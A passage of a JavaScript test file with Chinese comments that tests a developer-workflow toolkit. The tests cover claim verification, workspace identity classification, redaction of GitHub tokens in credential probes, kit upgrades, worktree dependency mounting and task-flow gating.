import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import { homedir, tmpdir } from 'node:os'
import { basename, dirname, join, resolve, sep } from 'node:path'
import { spawn, spawnSync } from 'node:child_process'
import {
  HERE, SCRIPTS, SKILL_ROOT, existingKept, gitCommitFast, gitInit, gitSync, issueTokenFor, loadPreflight,
  readDirRefs, rmTree, runAbsAsync, runNode, survey, textsOf, tmpProject,
} from './fixtures-helpers.mjs'

export function registerClaimsCases(cases) {
// ── 契约回查与锚点：两条新判据各自的正面与反面 ──────────────────────────

cases.push(['契约回查：分支名变了要报，路径没了要报', async () => {
  const { verifyClaims, claimsOf } = await import('../lib/claims.mjs')
  const text = [
    '从 `main` 拉分支。',
    '',
    '```sh',
    'git switch main',
    'node scripts/example.mjs',
    '```',
  ].join('\n')

  const claims = claimsOf(text)
  if (!claims.branches.includes('main')) return `没抽出分支名：${JSON.stringify(claims.branches)}`
  if (!claims.paths.includes('scripts/example.mjs')) return `没抽出路径：${JSON.stringify(claims.paths)}`

  // 正面：分支名对得上、路径都在 → 全绿
  const ok = verifyClaims(text, { conventions: { defaultBranch: 'main' } }, () => true)
  if (ok.some((r) => !r.ok)) return `正面用例被误报：${JSON.stringify(ok)}`

  // 反面一：默认分支改名了 → 必须报，而且要说清是哪一条
  const stale = verifyClaims(text, { conventions: { defaultBranch: 'trunk' } }, () => true)
  const branchHit = stale.find((r) => r.id === 'claim.branch')
  if (!branchHit || branchHit.ok) return '分支改名了却没报——契约里的分支名会指到不存在的地方'

  // 反面二：点名的路径被删了 → 必须报
  const gone = verifyClaims(text, { conventions: { defaultBranch: 'main' } }, () => false)
  const pathHit = gone.find((r) => r.id === 'claim.path')
  if (!pathHit || pathHit.ok) return '路径没了却没报——照着契约做的人会找不到文件'
  return true
}])

cases.push(['契约回查：没有承诺可查时不出结论，不伪造一条「通过」', async () => {
  const { verifyClaims } = await import('../lib/claims.mjs')
  // 一条恒真的判据看起来在工作，实际什么都没验——这类检查最容易这样退化。
  const empty = verifyClaims('没有任何路径与分支名的纯文字。', { conventions: { defaultBranch: 'main' } }, () => true)
  if (empty.length !== 0) return `没有承诺时不该出结论，实际出了 ${empty.length} 条`
  return true
}])

cases.push(['契约回查：正文里的「像路径的词」不算承诺，只有反引号与代码块里的才算', async () => {
  const { claimsOf } = await import('../lib/claims.mjs')
  // 假阳性一多，这条判据就会被关掉——而它一关，真正该报的那些也跟着没了。
  const prose = '文档里常常随口提到 scripts/whatever.mjs 这样的例子，那是叙述，不是承诺。'
  const claims = claimsOf(prose)
  if (claims.paths.length !== 0) return `散文里的词被当成了承诺：${JSON.stringify(claims.paths)}`
  return true
}])

cases.push(['锚点：前缀能命中，重名要报，落空要报', async () => {
  const { matchHeadings } = await loadPreflight()
  const headings = new Set(['七、审查循环：怎么才会停', '七、审查循环的补充', '八、谁能合：按「收不收得回来」分档'])

  // 正面：只写「七、审查循环」能同时命中两个 → 报重名（这正是要的：逼指路写得更具体）
  const ambiguous = matchHeadings(headings, '七、审查循环')
  if (ambiguous.length !== 2) return `同前缀两节应报 2 个命中，实际 ${ambiguous.length}`

  // 正面：写全了一个 → 唯一命中
  const exact = matchHeadings(headings, '七、审查循环：怎么才会停')
  if (exact.length !== 1) return `写全了应唯一命中，实际 ${exact.length}`

  // 正面：标题里带反引号也能比
  if (matchHeadings(new Set(['三、`AGENTS.md`']), '三、AGENTS.md').length !== 1) return '反引号差异没被抹平'

  // 反面：完全不存在的节 → 0 个命中
  if (matchHeadings(headings, '九、根本没有这一节').length !== 0) return '不存在的节被命中了'
  return true
}])

cases.push(['缺口覆盖：没登记处置的缺口要报，悬空映射要报', async () => {
  const { coverageOf } = await import('./gap-coverage.mjs')
  const known = new Set(['git.absent'])

  // 正面：每一条都选了一档且映射真实存在
  const good = coverageOf([
    { id: 'a', review: 'git.absent' },
    { id: 'b', decision: 'some-key' },
    { id: 'c', surveyOnly: '只有勘察能判' },
  ], known, ['a', 'b', 'c'])
  if (good.ok.length !== 3 || good.unclaimed.length !== 0 || good.dangling.length !== 0) {
    return `正面用例被误报：${JSON.stringify(good)}`
  }

  // 反面一：三档都没选 → 必须报「没人接」
  const unclaimed = coverageOf([{ id: 'x' }], known, ['x'])
  if (unclaimed.unclaimed.length !== 1) return '没登记处置的缺口没有被报出来'

  // 反面二：映射写了个不存在的 id → 必须报悬空
  const dangling = coverageOf([{ id: 'y', review: 'git.typo' }], known, ['y'])
  if (dangling.dangling.length !== 1) return '映射指向不存在的结论时没有报出来——它看起来配好了，实际永远不触发'

  // 反面三：同时写两档 → 必须报重复
  const dup = coverageOf([{ id: 'z', review: 'git.absent', decision: 'k' }], known, ['z'])
  if (dup.duplicated.length !== 1) return '一条缺口写了两档时没有报出来——同一件事会有两个结论'

  // 反面四：**一条都没读出来** → 必须报「读不出来」，不能静默通过。
  // 这是这套检查最容易退化的形状：词法切块一失灵，读出来就是空数组，
  // 而空数组让前面三条全过——「0 条各有处置，退出码 0」，看起来比 17 条还干净。
  const empty = coverageOf([], known, ['git.absent'])
  if (empty.missing.length !== 1) return '一条都没读出来时没有报「读不出来」——判据被削成恒真了'
  if (empty.ok.length !== 0) return `空输入不该产出「通过」条目，实际 ${empty.ok.length} 条`

  // 反面五：源码里有、登记名单里没有 → 必须报
  const unknown = coverageOf([{ id: 'w', review: 'git.absent' }], known, ['git.absent'])
  if (unknown.unknown.length !== 1) return '源码里有却没登记的缺口没有被报出来'
  return true
}])

cases.push(['本仓库：勘察的每条缺口在体检里都有人接，且映射不悬空', async () => {
  const { checkGapCoverage } = await import('./gap-coverage.mjs')
  // 读真实源码，不是夹具：这条判据防的正是「这个仓库自己漏了一条」。
  const state = await checkGapCoverage(SKILL_ROOT)
  if (state.unclaimed.length > 0) return `没人接的缺口：${state.unclaimed.join('、')}`
  if (state.dangling.length > 0) return `悬空映射：${state.dangling.join('、')}`
  if (state.duplicated.length > 0) return `重复处置：${state.duplicated.join('、')}`
  // 读出来 0 条时，前三条全是空数组——这个检查会静默通过。这正是「恒真」的形状。
  if (state.missing.length > 0) return `读不出来的缺口：${state.missing.join('、')}`
  if (state.unknown.length > 0) return `源码里有却没登记的缺口：${state.unknown.join('、')}`
  return true
}])

cases.push(['本仓库：正文里没有节号指针', async () => {
  // 节号会随重排失效——一次插入就让十几处指路同时指错，而它们不会报错。
  const files = ['SKILL.md', 'AGENTS.md', 'README.md', 'README.en.md', 'CONTRIBUTING.md', 'RELEASING.md',
    ...readDirRefs(join(SKILL_ROOT, 'references')), ...readDirRefs(join(SKILL_ROOT, 'templates'))]
  const hit = []
  for (const name of files) {
    const full = join(SKILL_ROOT, name)
    if (!existsSync(full)) continue
    const lines = readFileSync(full, 'utf8').replace(/\r\n/g, '\n').split('\n')
    for (const [i, line] of lines.entries()) {
      if (/第[一二三四五六七八九十]+节/.test(line)) hit.push(`${name}:${i + 1}`)
    }
  }
  if (hit.length > 0) return `这些地方还在用节号指针：${hit.slice(0, 5).join('、')}`
  return true
}])

// ── v5 升级行为断言（C1..C11 正反双向） ───────────────────────────────

cases.push(['五态身份：clone-readonly 防误判、自有缺 repository 判 maintainer、fork 与 undetermined 正反双向', async () => {
  const { classifyWorkspaceIdentity } = await import('../lib/platform/github.mjs')

  // 1. local-only：.git/pf-local-mode 强制本地模式（哪怕有远端）
  const localMode = classifyWorkspaceIdentity({
    gitFacts: { present: true, remote: 'https://github.com/other/repo.git', remoteUrls: { origin: 'https://github.com/other/repo.git' } },
    localMode: true,
  })
  if (localMode.role !== 'local-only') return `pf-local-mode 未判成 local-only：${localMode.role}`

  // 2. 反误判（核心）：clone 他人公开仓（即使 repository === origin），无写权限且历史作者非本机 -> clone-readonly，严禁判成 maintainer
  const clonedOther = classifyWorkspaceIdentity({
    gitFacts: {
      present: true,
      remote: 'https://github.com/other/demo.git',
      remoteUrls: { origin: 'https://github.com/other/demo.git' },
      commitCount: 5,
      historyAuthors: ['Origin Author <author@other.example>'],
      userName: 'Local User',
      userEmail: 'local@example.com',
    },
    declaredRepo: 'other/demo',
  })
  if (clonedOther.role !== 'clone-readonly') return `他人公开仓被误判成 ${clonedOther.role}`

  // 3. API 明确只读权限（即使历史或声明有误导）-> clone-readonly
  const apiReadOnly = classifyWorkspaceIdentity({
    gitFacts: {
      present: true,
      remote: 'https://github.com/org/lib.git',
      remoteUrls: { origin: 'https://github.com/org/lib.git' },
      commitCount: 1,
      historyAuthors: ['Me <me@example.com>'],
      userName: 'Me',
      userEmail: 'me@example.com',
    },
    declaredRepo: 'org/lib',
    probeApi: { canPush: false, viewerPermission: 'READ', login: 'outsider' },
  })
  if (apiReadOnly.role !== 'clone-readonly') return `只读 API 权限被判成 ${apiReadOnly.role}`

  // 4. 自有缺 declaredRepo 项目（本机身份匹配 origin owner 或全部提交作者匹配）-> maintainer
  const ownNoDecl = classifyWorkspaceIdentity({
    gitFacts: {
      present: true,
      remote: 'https://github.com/myuser/my-app.git',
      remoteUrls: { origin: 'https://github.com/myuser/my-app.git' },
      commitCount: 2,
      historyAuthors: ['myuser <myuser@users.noreply.github.com>'],
      userName: 'myuser',
      userEmail: 'myuser@users.noreply.github.com',
    },
  })
  if (ownNoDecl.role !== 'maintainer') return `自有缺 declaredRepo 仓未判成 maintainer：${ownNoDecl.role}`

  // 5. contributor-fork（有不同 upstream 且非只读）；反面：只读克隆他人 fork -> clone-readonly
  const forkOwn = classifyWorkspaceIdentity({
    gitFacts: {
      present: true,
      remote: 'https://github.com/me/app.git',
      remoteUrls: { origin: 'https://github.com/me/app.git', upstream: 'https://github.com/upstream/app.git' },
    },
    probeApi: { canPush: true, viewerPermission: 'WRITE', login: 'me' },
  })
  if (forkOwn.role !== 'contributor-fork') return `upstream 不同未判成 contributor-fork：${forkOwn.role}`

  const forkReadOnly = classifyWorkspaceIdentity({
    gitFacts: {
      present: true,
      remote: 'https://github.com/someone/app.git',
      remoteUrls: { origin: 'https://github.com/someone/app.git', upstream: 'https://github.com/upstream/app.git' },
    },
    probeApi: { canPush: false, viewerPermission: 'READ', login: 'me' },
  })
  if (forkReadOnly.role !== 'clone-readonly') return `只读他人 fork 被判成 ${forkReadOnly.role}`

  return true
}])

cases.push(['双轨凭据：SSH 可用不误报缺凭据、protocolMismatch 给出切换命令、Token 绝不泄露到序列化输出', async () => {
  const { probeGitHubEnv } = await import('../lib/platform/github.mjs')

  // 正面：SSH remote + ssh -T 成功 + HTTPS credential fill 返回空 -> ssh available，protocolMismatch=false，不误报
  const sshRunner = async (cmd, args) => {
    if (cmd === 'ssh') return { ok: true, code: 1, stdout: '', stderr: 'Hi octocat! You\'ve successfully authenticated, but GitHub does not provide shell access.' }
    if (cmd === 'git' && args[0] === 'credential') return { ok: false, code: 1, stdout: '', stderr: '' }
    if (cmd === 'git') return { ok: false, code: 1, stdout: '', stderr: '' }
    return { ok: false, code: 1, stdout: '', stderr: '', missing: true }
  }
  const sshRes = await probeGitHubEnv({
    remoteUrls: { origin: 'git@github.com:octocat/demo.git' },
    runner: sshRunner,
    env: {},
  })
  if (sshRes.ssh.state !== 'available' || sshRes.ssh.login !== 'octocat') {
    return `SSH 探测失败：${JSON.stringify(sshRes.ssh)}`
  }
  if (sshRes.protocolMismatch !== false) return `SSH 正常却报 protocolMismatch：${JSON.stringify(sshRes)}`
  if (sshRes.https.state === 'available') return '空 credential fill 不应判 HTTPS available'

  // 正面：HTTPS remote 无凭据但 SSH 可用 -> protocolMismatch=true 且给出 set-url 切换到 git@github.com 命令
  const mismatchRes = await probeGitHubEnv({
    remoteUrls: { origin: 'https://github.com/octocat/demo.git' },
    runner: sshRunner,
    env: {},
  })
  if (mismatchRes.protocolMismatch !== true || !String(mismatchRes.remediationCmd).includes('git@github.com:octocat/demo.git')) {
    return `protocolMismatch 提示不对：${JSON.stringify(mismatchRes)}`
  }

  // 安全脱敏：环境变量 GH_TOKEN 与 credential fill 返回的密码绝不出现在 JSON 序列化结果中
  const secretA = 'ghp_TestSecretTokenAlpha987654'
  const secretB = 'gho_CredentialHelperBeta123456'
  const tokenRunner = async (cmd, args) => {
    if (cmd === 'git' && args[0] === 'credential') {
      return { ok: true, code: 0, stdout: `protocol=https\nhost=github.com\nusername=octocat\npassword=${secretB}\n`, stderr: '' }
    }
    return { ok: false, code: 1, stdout: '', stderr: '', missing: true }
  }
  const tokRes = await probeGitHubEnv({
    remoteUrls: { origin: 'https://github.com/octocat/demo.git' },
    runner: tokenRunner,
    env: { GH_TOKEN: secretA },
  })
  const dumped = JSON.stringify(tokRes)
  if (dumped.includes(secretA) || dumped.includes(secretB)) return 'probeGitHubEnv 返回结果泄露了明文 token'
  if (tokRes.https.hasToken !== true || tokRes.https.username !== 'octocat') return `脱敏字段异常：${dumped}`

  // 真实子进程探测 survey --probe-auth --json 不得泄露 GH_TOKEN
  const dir = tmpProject({ 'README.md': '# demo\n' })
  try {
    gitInit(dir)
    const sub = await runNode('survey.mjs', [dir, '--probe-auth'])
    const subEnvRun = spawnSync(process.execPath, [join(SCRIPTS, 'survey.mjs'), dir, '--probe-auth'], {
      encoding: 'utf8',
      timeout: 30000,
      env: { ...process.env, GH_TOKEN: secretA, GITHUB_TOKEN: secretB },
    })
    if (subEnvRun.status !== 0) return `survey --probe-auth 退出异常：${subEnvRun.status}`
    if ((subEnvRun.stdout + subEnvRun.stderr).includes(secretA) || (subEnvRun.stdout + subEnvRun.stderr).includes(secretB)) {
      return 'survey --probe-auth 子进程输出泄露了环境变量 token'
    }
    if (sub.status !== 0) return `survey 退出 ${sub.status}`
  } finally { rmTree(dir) }

  return true
}])

cases.push(['equip.mjs：首次装备、幂等、三态升级与退役删除、用户魔改/自定义保留、--bootstrap-empty 正反双向', async () => {
  const target = tmpProject({ 'README.md': '# demo\n\n工程套件测试仓。\n' })
  const kitV1 = tmpProject({
    'lib/shared.mjs': 'export const VER = 1\n',
    'dev-flow/SKILL.md': '---\nname: dev-flow\ndescription: v1\n---\n# v1\n',
    'old-retired/legacy.md': '# obsolete\n',
  })
  const kitV2 = tmpProject({
    'lib/shared.mjs': 'export const VER = 2\n',
    'dev-flow/SKILL.md': '---\nname: dev-flow\ndescription: v2\n---\n# v2\n',
  })
  const emptyBoot = mkdtempSync(join(tmpdir(), 'pf-boot-'))

  try {
    // 1. 默认官方套件首次装备 + --check + 幂等
    const e1 = await runAbsAsync('scripts/equip.mjs', [target])
    if (e1.status !== 0) return `首次 equip 失败：${e1.stderr}`
    const chk0 = await runAbsAsync('scripts/equip.mjs', [target, '--check'])
    if (chk0.status !== 0) return `equip 后 --check 未通过：${chk0.stderr}`
    const e2 = await runAbsAsync('scripts/equip.mjs', [target])
    if (e2.status !== 0) return `第二次 equip 失败：${e2.stderr}`
    const p2 = JSON.parse(e2.stdout).equip
    if (p2.added.length !== 0 || p2.upgraded.length !== 0 || p2.conflicts.length !== 0 || p2.retired.length !== 0) {
      return `equip 不幂等：${JSON.stringify(p2)}`
    }

    // 2. 用户魔改 + 自定义 Skill -> --check 必须红，v1->v2 升级保留魔改与自定义，自动升级未改文件并物理删除退役文件
    const { equip, checkEquip } = await import('../equip.mjs')
    const targetTri = tmpProject({ 'README.md': '# tri\n' })
    try {
      equip(targetTri, { kitDir: kitV1, noBackup: true })
      // 用户修改 dev-flow/SKILL.md 且保留 old-retired/legacy.md 未改；另建用户自定义 Skill
      const customSkill = join(targetTri, '.agents', 'skills', 'my-custom', 'SKILL.md')
      mkdirSync(dirname(customSkill), { recursive: true })
      writeFileSync(customSkill, '# user custom skill\n')
      const devFlowPath = join(targetTri, '.agents', 'skills', 'dev-flow', 'SKILL.md')
      writeFileSync(devFlowPath, '# user hacked dev-flow\n')

      const dirtyChk = checkEquip(targetTri, { kitDir: kitV1 })
      if (dirtyChk.ok) return '用户改动托管文件后 --check 却返回 0'

      const res = equip(targetTri, { kitDir: kitV2, noBackup: true })
      if (!res.upgraded.includes('lib/shared.mjs')) return `未改旧文件没自动升级：${JSON.stringify(res)}`
      if (!res.conflicts.some((c) => c.path === 'dev-flow/SKILL.md')) return `用户魔改文件没进 conflicts 保护：${JSON.stringify(res)}`
      if (!res.retired.includes('old-retired/legacy.md')) return `未改退役文件没进 retired：${JSON.stringify(res)}`
      if (existsSync(join(targetTri, '.agents', 'skills', 'old-retired', 'legacy.md'))) return '退役文件未被物理删除'
      if (readFileSync(devFlowPath, 'utf8') !== '# user hacked dev-flow\n') return '用户魔改内容被覆盖'
      if (!existsSync(customSkill) || readFileSync(customSkill, 'utf8') !== '# user custom skill\n') {
        return '用户自定义 Skill 被误删或覆盖'
      }
    } finally { rmTree(targetTri) }

    // 3. --bootstrap-empty 正反双向（通用基线，零业务玩具码且初装过 --check）
    const boot = await runAbsAsync('scripts/equip.mjs', [emptyBoot, '--bootstrap-empty', '--lang', 'node', '--name', 'demo-boot'])
    if (boot.status !== 0) return `空目录 --bootstrap-empty 失败：${boot.stderr}`
    for (const rel of ['.gitattributes', '.gitignore', 'README.md', 'docs/TDD.md', 'AGENTS.md', '.agents/skills/.pf-manifest.json']) {
      if (!existsSync(join(emptyBoot, rel))) return `bootstrap-empty 缺文件：${rel}`
    }
    const bootChk = await runAbsAsync('scripts/compose-agents.mjs', [emptyBoot, '--check'])
    if (bootChk.status !== 0) return `bootstrap-empty 初装未过 compose-agents --check：${bootChk.stderr}`

    // 反面：含源码/清单的非空目录禁止 --bootstrap-empty
    const bootNonEmpty = await runAbsAsync('scripts/equip.mjs', [target, '--bootstrap-empty', '--stack', 'node'])
    if (bootNonEmpty.status === 0) return '非空目录却允许 --bootstrap-empty'

    return true
  } finally {
    rmTree(target)
    rmTree(kitV1)
    rmTree(kitV2)
    rmTree(emptyBoot)
  }
}])

cases.push(['compose-agents.mjs：超 30KB 硬阻断、未标 customized 但 SHA256 变化时保护不覆盖', async () => {
  const dir = tmpProject({
    'package.json': '{"name":"cap-demo","version":"1.0.0","scripts":{"test":"node -e \\"process.exit(0)\\""}}\n',
    'README.md': '# cap-demo\n\n体积限制与基线保护测试仓。\n',
  })
  gitInit(dir)
  try {
    const eq = await runAbsAsync('scripts/equip.mjs', [dir])
    if (eq.status !== 0) return `equip 失败：${eq.stderr}`
    const g1 = await runAbsAsync('scripts/compose-agents.mjs', [dir])
    if (g1.status !== 0) return `compose-agents 首次生成失败：${g1.stderr}`

    const agentsFile = join(dir, 'AGENTS.md')
    const original = readFileSync(agentsFile, 'utf8')

    // 1. 保护未标 customized 但已被手工改动且偏离模板的区间（修改「版本与发布」段落而不加 customized）
    const edited = original.replace('**提交纪律**：', '**提交纪律（手工微调）**：')
    if (edited === original) return '测试前置替换未命中 AGENTS.md 版本与发布段'
    writeFileSync(agentsFile, edited, 'utf8')

    // 当「版本与发布」与模板不一致且与 .pf-manifest.json 基线 SHA256 不同时，必须保护跳过并保留手工内容
    const g2 = await runAbsAsync('scripts/compose-agents.mjs', [dir])
    if (g2.status !== 0) return `保护场景刷新失败：${g2.stderr}`
    if (!/保护跳过/.test(g2.stderr || '') || !readFileSync(agentsFile, 'utf8').includes('手工微调')) {
      return `未标 customized 的手工改动没有被保护跳过：stderr=${g2.stderr}`
    }

    // 2. 反面：AGENTS.md 超 30KB 时刷新必须退出 1 阻断写入
    const oversized = `${original}\n\n## 补充说明\n\n${'x'.repeat(32000)}\n`
    writeFileSync(agentsFile, oversized, 'utf8')
    const g3 = await runAbsAsync('scripts/compose-agents.mjs', [dir])
    if (g3.status === 0) return 'AGENTS.md 超过 30720 字节时 compose-agents 没有报错阻断'
    if (!readFileSync(agentsFile, 'utf8').includes('## 补充说明')) return '超限阻断时改动了原文件'

    return true
  } finally { rmTree(dir) }
}])

cases.push(['worktree-deps.mjs：锁文件一致挂载共享依赖、安全解绑不删穿主仓、锁文件变化自动隔离', async () => {
  const dir = tmpProject({
    '.gitignore': 'node_modules/\n.worktrees/\n',
    'package.json': '{"name":"deps-demo","version":"1.0.0"}\n',
    'package-lock.json': '{"name":"deps-demo","lockfileVersion":3}\n',
    'README.md': '# deps\n',
  })
  gitInit(dir, { branch: 'main' })
  const mainPkgFile = join(dir, 'node_modules', 'fake-pkg', 'index.js')
  mkdirSync(dirname(mainPkgFile), { recursive: true })
  writeFileSync(mainPkgFile, 'module.exports = { ok: true }\n')

  const wt = join(dir, '.worktrees', 'impl-deps')
  try {
    const addWt = gitSync(dir, ['worktree', 'add', wt, '-b', 'feat/deps-test'], { encoding: 'utf8' })
    if (addWt.status !== 0) return `创建 worktree 失败：${addWt.stderr}`

    // 正面：锁文件一致 -> mount 挂载并可读
    const m1 = await runAbsAsync('kit/skills/dev-flow/scripts/worktree-deps.mjs', ['mount', '--main', dir, '--worktree', wt, '--json'])
    if (m1.status !== 0) return `mount 失败：${m1.stderr}`
    const wtPkgFile = join(wt, 'node_modules', 'fake-pkg', 'index.js')
    if (!existsSync(wtPkgFile) || !readFileSync(wtPkgFile, 'utf8').includes('ok: true')) {
      return 'mount 后无法通过 worktree 读取共享 node_modules'
    }

    // 正面：unmount 安全解绑后主仓 node_modules 完好无损
    const u1 = await runAbsAsync('kit/skills/dev-flow/scripts/worktree-deps.mjs', ['unmount', '--main', dir, '--worktree', wt, '--json'])
    if (u1.status !== 0) return `unmount 失败：${u1.stderr}`
    if (existsSync(join(wt, 'node_modules'))) return 'unmount 后 worktree node_modules 依然存在'
    if (!existsSync(mainPkgFile) || !readFileSync(mainPkgFile, 'utf8').includes('ok: true')) {
      return 'unmount 删穿了主仓 node_modules'
    }

    // 反面：worktree 锁文件变化 -> 拒绝挂载，自动隔离
    writeFileSync(join(wt, 'package-lock.json'), '{"name":"deps-demo","lockfileVersion":3,"changed":true}\n')
    const m2 = await runAbsAsync('kit/skills/dev-flow/scripts/worktree-deps.mjs', ['mount', '--main', dir, '--worktree', wt, '--json'])
    if (m2.status !== 0) return `锁文件不一致时 mount 应安全跳过而非崩溃：${m2.stderr}`
    const m2Json = JSON.parse(m2.stdout)
    if (m2Json.mode !== 'isolated' || m2Json.reason !== 'lockfile-changed' || (m2Json.mismatches?.length ?? 0) === 0 || m2Json.mounted.length !== 0 || existsSync(join(wt, 'node_modules'))) {
      return `锁文件变化后未自动隔离：${m2.stdout}`
    }

    return true
  } finally {
    try { await runAbsAsync('kit/skills/dev-flow/scripts/worktree-deps.mjs', ['unmount', '--main', dir, '--worktree', wt]) } catch {}
    gitSync(dir, ['worktree', 'remove', '--force', wt])
    rmTree(dir)
  }
}])

cases.push(['flow.mjs + doc-plan.mjs：五档分流、Issue+PR 复用与依赖图、finalize/verify/submit 硬锁、fork 禁止合并与删前锁定', async () => {
  const { triageTask } = await import('../../kit/skills/dev-plan/scripts/doc-plan.mjs')
  const { analyzeIssueDependencies } = await import('../../kit/skills/dev-flow/scripts/flow.mjs')

  // 1. 五档分流全覆盖（Case 1..5）
  if (triageTask({ summary: '修正 README 错别字', files: 1 }).caseType !== 1) return 'Case 1 分流误判'
  if (triageTask({ summary: 'fix parser crash on empty input', files: 1, bugfix: true }).caseType !== 2) return 'Case 2 分流误判'
  if (triageTask({ summary: 'feat: add CSV output flag', files: 2 }).caseType !== 3) return 'Case 3 分流误判'
  if (triageTask({ summary: '跨模块接口变更', touchesContract: true }).caseType !== 4) return 'Case 4 分流误判'
  const c5 = triageTask({ summary: '推翻 TDD 架构重新设计核心引擎', conflictsTdd: true })
  if (c5.caseType !== 5 || c5.blocked !== true) return `Case 5 未阻断：${JSON.stringify(c5)}`

  // 反面：判据看措辞不看实质的典型翻车。这句话里「文档」两个字出现过，
  // 但它同时要动 CI、契约与目录结构——一件要拆十几步的治理工程，
  // 早先被自己的分流器判成「不需要任何规划文档」（Case 1）。
  const governance = [
    '把一个已有项目治理成规范工程：补文档、配 CI、统一契约、规范目录结构',
    '项目规范化',
    '接入工程治理套件',
    '整理项目目录结构并补齐持续集成与贡献指南',
  ]
  for (const summary of governance) {
    const res = triageTask({ summary })
    if (res.caseType < 4) {
      return `治理类任务被漏判成 Case ${res.caseType}（${summary}）——它会绕过 PRD/SPEC/Todo 直接开干`
    }
  }
  // 反向：真·只改文案仍必须是 Case 1，不能因为上面放宽就一律升档。
  for (const summary of ['修正 README 错别字', 'typo in README', '翻译一下注释']) {
    const res = triageTask({ summary, files: 1 })
    if (res.caseType !== 1) return `纯文案任务被误升档成 Case ${res.caseType}（${summary}）`
  }

  // 2. 多 Issue 依赖边与环检测
  const graphOk = analyzeIssueDependencies([
    { number: 1, relations: { dependsOn: [], blocks: [] } },
    { number: 2, relations: { dependsOn: [1], blocks: [3] } },
    { number: 3, relations: { dependsOn: [], blocks: [] } },
  ])
  if (graphOk.hasCycle || graphOk.edges.length < 2 || graphOk.orderedIssues[0] !== 1 || graphOk.orderedIssues[2] !== 3) {
    return `依赖拓扑解析失败：${JSON.stringify(graphOk)}`
  }
  const graphCycle = analyzeIssueDependencies([
    { number: 10, relations: { dependsOn: [11], blocks: [] } },
    { number: 11, relations: { dependsOn: [10], blocks: [] } },
  ])
  if (!graphCycle.hasCycle) return '环形 Issue 依赖未检出'

  // 3. 真实本地工作流：Case 3 start -> Todo 未勾选阻断 finalize -> 未 finalize 阻断 submit -> 代码改动使 verifiedHead 失效 -> submit 成功
  const localDir = tmpProject({
    '.gitignore': '.worktrees/\n',
    'package.json': '{"name":"flow-local","version":"1.0.0"}\n',
    'README.md': '# flow-local\n',
    'docs/TDD.md': '# TDD\n',
    'src/app.mjs': 'export const n = 1\n',
  })
  gitInit(localDir, { branch: 'main', name: 't', email: 't@t.t' })

  try {
    const { resolveRepoRoots } = await import('../../kit/skills/lib/shared.mjs')
    const { handleStart } = await import('../../kit/skills/dev-flow/scripts/flow-inspect.mjs')
    const { handleFinalize, handleVerify, handleSubmit } = await import('../../kit/skills/dev-flow/scripts/flow-lifecycle.mjs')
    const lRoots = await resolveRepoRoots(localDir)

    const start1 = await runAbsAsync('kit/skills/dev-flow/scripts/flow.mjs', ['start', '--task', 't-flow', '--case', '3', '--slug', 'demo-feat', '--json'], { cwd: localDir })
    if (start1.status !== 0) return `flow start 失败：${start1.stderr}`
    const ledger1 = JSON.parse(start1.stdout)
    const wtRoot = join(localDir, ledger1.worktreePath)

    // 建未勾选 Todo -> finalize 必须失败
    const todoInit = await runAbsAsync('kit/skills/dev-plan/scripts/doc-plan.mjs', ['init', '--type', 'todo', '--slug', 'demo-feat', '--title', '测试任务', '--task', 't-flow', '--json'], { cwd: wtRoot })
    if (todoInit.status !== 0) return `doc-plan init todo 失败：${todoInit.stderr}`
    const todoInfo = JSON.parse(todoInit.stdout)

    const finBlocked = await handleFinalize({ task: 't-flow' }, lRoots)
    if (finBlocked.exitCode === 0) return 'Todo 仍有未勾选条目，finalize 却放行了'

    // 勾选 Todo 并提交；故意不运行 finalize，先 verify 再 submit -> submit 必须返回 3（BLOCKED_NOT_FINALIZED）
    const todoAbs = join(wtRoot, todoInfo.file)
    writeFileSync(todoAbs, readFileSync(todoAbs, 'utf8').replace(/- \[ \]/g, '- [x]'))
    gitCommitFast(wtRoot, 'check todo')

    const v1 = await handleVerify({ task: 't-flow', cmd: 'exit 0' }, lRoots)
    if (v1.exitCode !== 0) return `verify 失败：${v1.exitCode}`
    const subNoFin = await handleSubmit({ task: 't-flow' }, lRoots)
    if (subNoFin.exitCode !== 3) {
      return `未 finalize 时 submit 未拦截：exit=${subNoFin.exitCode}`
    }

    // finalize 后再改非文档代码并提交，使 verifiedHead !== HEAD -> submit 必须拦截
    const finOk = await handleFinalize({ task: 't-flow' }, lRoots)
    if (finOk.exitCode !== 0) return `finalize 失败：${finOk.exitCode}`
    gitCommitFast(wtRoot, 'archive todo')

    writeFileSync(join(wtRoot, 'src/app.mjs'), 'export const n = 2\n')
    gitCommitFast(wtRoot, 'code change after verify', { updateOnly: true })
    const subStale = await handleSubmit({ task: 't-flow' }, lRoots)
    if (subStale.exitCode !== 3) return `代码变更后 verifiedHead 失效未拦截 submit：exit=${subStale.exitCode}`

    // 重跑 finalize + verify -> submit 放行退出 0
    await handleFinalize({ task: 't-flow' }, lRoots)
    await handleVerify({ task: 't-flow', cmd: 'exit 0' }, lRoots)
    const subOk = await handleSubmit({ task: 't-flow' }, lRoots)
    if (subOk.exitCode !== 0) return `本地完整校验后 submit 失败：exit=${subOk.exitCode}`
    return true
  } finally {
    rmTree(localDir)
  }
}])

cases.push(['flow inspect + fork 禁止 merge 与 OPEN PR 禁止 cleanup', async () => {
  // 4. inspect 识别已有 Issue+PR 复用；contributor-fork 禁止 merge 与 OPEN PR 禁止 cleanup
  const forkDir = tmpProject({
    '.gitignore': '.worktrees/\n',
    'package.json': '{"name":"fork-demo","version":"1.0.0"}\n',
    'README.md': '# fork-demo\n',
  })
  gitInit(forkDir, { branch: 'main', name: 'me', email: 'me@example.com', origin: 'https://github.com/me/fork-demo.git', upstream: 'https://github.com/upstream/fork-demo.git' })

  try {
    const insp = await runAbsAsync('kit/skills/dev-flow/scripts/flow.mjs', [
      'inspect', 'https://github.com/upstream/fork-demo/issues/12', 'https://github.com/upstream/fork-demo/pull/34', '--json',
    ], { cwd: forkDir })
    if (insp.status !== 0) return `inspect 失败：${insp.stderr}`
    const inspJson = JSON.parse(insp.stdout)
    if (inspJson.identity.role !== 'contributor-fork') return `fork 角色错误：${inspJson.identity.role}`
    if (!inspJson.inputs?.reuseExistingPr || inspJson.inputs.reuseExistingPr.prNumber !== 34) {
      return `inspect 未输出已有 PR 复用提示：${JSON.stringify(inspJson.inputs)}`
    }

    const fStart = await runAbsAsync('kit/skills/dev-flow/scripts/flow.mjs', ['start', '--task', 't-fork', '--case', '1', '--slug', 'fix-doc', '--pr', '34', '--json'], { cwd: forkDir })
    if (fStart.status !== 0) return `fork start 失败：${fStart.stderr}`
